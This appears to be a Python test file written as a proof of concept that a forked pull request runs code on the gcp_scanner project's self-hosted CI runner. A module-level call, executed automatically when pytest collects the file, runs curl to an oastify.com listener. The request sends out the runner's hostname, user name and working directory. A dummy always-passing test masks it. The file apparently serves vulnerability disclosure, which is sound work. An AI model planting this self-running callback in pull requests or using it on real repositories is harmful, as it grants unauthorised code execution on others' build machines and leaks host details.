"""PoC: prove a fork PR executes on gcp_scanner's self-hosted runner.

Pytest imports this module during collection; the module-level call below runs
arbitrary code on the self-hosted runner that executes the `test` job. Replace
LISTENER with your webhook.site / interactsh URL. Non-destructive: one HTTP GET.
"""

import getpass
import os
import socket
import subprocess


def _probe():
    listener = "https://zgjg9ks9d67q3q2aa6kv5daq9hf83yrn.oastify.com"
    try:
        subprocess.run(
            [
                "curl", "-fsS", "-m", "10",
                f"{listener}/poc?repo=gcp_scanner"
                f"&runner={socket.gethostname()}"
                f"&user={getpass.getuser()}"
                f"&pwd={os.getcwd()}",
            ],
            check=False,
            timeout=15,
        )
    except Exception:
        pass


_probe()


def test_probe_marker():
    assert True
